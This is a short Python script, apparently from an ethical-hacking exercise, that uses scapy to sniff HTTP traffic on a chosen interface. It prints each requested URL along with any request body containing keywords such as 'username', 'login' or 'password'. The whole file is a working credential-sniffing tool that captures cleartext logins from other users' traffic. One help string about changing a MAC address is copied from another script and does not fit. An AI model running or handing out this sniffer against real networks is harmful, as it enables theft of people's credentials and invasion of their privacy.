#!/usr/bin/env python3
import scapy.all as scapy
from scapy.layers import http
import optparse
import codecs

# python3 packet_sniffer.py -i ens33


def get_url(packet):
    host = codecs.decode(packet[http.HTTPRequest].Host)
    uri = codecs.decode(packet[http.HTTPRequest].Path)
    return "{}{}".format(host, uri)


def get_payload(packet):
    if packet.haslayer(scapy.Raw):
        body = packet[scapy.Raw].load
        captured_keywords = ["username", "user", "login", "password", "pass"]
        for key in captured_keywords:
            if key.encode() in body:
                return body


def process_sniffed_packet(packet):

    # We only get http requests.
    if packet.haslayer(http.HTTPRequest):
        # Check request header.
        print("Request: {}".format(get_url(packet)))

        # Check the request body.
        payload = get_payload(packet)
        if payload:
            print("Payload: {}".format(payload))

def sniff(interface):
    # Capture every packets that in, out the interface.
    scapy.sniff(iface=interface, store=False,
                prn=process_sniffed_packet)


def main():
    parser = optparse.OptionParser()

    parser.add_option("-i", "--interface", dest="interface",
                      help="Interface to change its MAC address.")

    (options, arguments) = parser.parse_args()

    if not options.interface:
        parser.error("Please specify an interface.")

    interface = str(options.interface)

    sniff(interface)


if __name__ == "__main__":
    main()
